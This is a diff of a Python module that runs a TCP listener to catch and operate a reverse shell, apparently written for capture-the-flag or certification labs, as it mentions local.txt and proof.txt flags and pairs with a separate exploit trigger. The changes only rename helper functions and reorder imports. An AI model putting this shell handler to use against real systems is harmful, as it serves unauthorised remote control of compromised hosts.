@@ -7,6 +7,7 @@ Usage (standalone):
 
 Usage (copy start_listener into your exploit script):
     import threading
+    import socket
 
     listener_t = threading.Thread(target=start_listener, args=(lhost, lport), daemon=True)
     listener_t.start()
@@ -14,18 +15,18 @@ Usage (copy start_listener into your exploit script):
     trigger_revshell()
     listener_t.join()
 """
+import sys
 
 import socket
-import sys
 import threading
 
 # ==============================================================================
 # CONSOLE HELPERS (inline so this module is self-contained)
 # ==============================================================================
 
-def _ok(msg):   print(f"  [+] {msg}")
-def _info(msg): print(f"  [*] {msg}")
-def _err(msg):  print(f"  [-] {msg}")
+def print_ok(msg):   print(f"  [+] {msg}")
+def print_info(msg): print(f"  [*] {msg}")
+def print_err(msg):  print(f"  [-] {msg}")
 
 # ==============================================================================
 # LISTENER (copy start_listener into your main script)
@@ -49,10 +50,10 @@ def start_listener(lhost: str, lport: int) -> None:
     srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     srv.bind((lhost, lport))
     srv.listen(1)
-    _info(f"TCP listener active on {lhost}:{lport} — waiting for callback...")
+    print_info(f"TCP listener active on {lhost}:{lport} — waiting for callback...")
 
     conn, addr = srv.accept()
-    _ok(f"Session from {addr[0]}:{addr[1]}")
+    print_ok(f"Session from {addr[0]}:{addr[1]}")
     print("------------------------------------------------------------------------------------")
     print('# Reverse Shell Connected. Run "cat local.txt" / "cat proof.txt" for flags.')
     print("------------------------------------------------------------------------------------")
@@ -67,7 +68,7 @@ def start_listener(lhost: str, lport: int) -> None:
             try:
                 data = conn.recv(4096)
                 if not data:
-                    _err("Remote end closed the connection.")
+                    print_err("Remote end closed the connection.")
                     stop.set()
                     break
                 print(data.decode("utf-8", errors="replace"), end="", flush=True)
@@ -81,7 +82,7 @@ def start_listener(lhost: str, lport: int) -> None:
                 line = input() + "\n"
                 conn.send(line.encode("utf-8"))
             except (EOFError, KeyboardInterrupt):
-                _info("Session terminated by operator.")
+                print_info("Session terminated by operator.")
                 stop.set()
                 break
             except Exception:
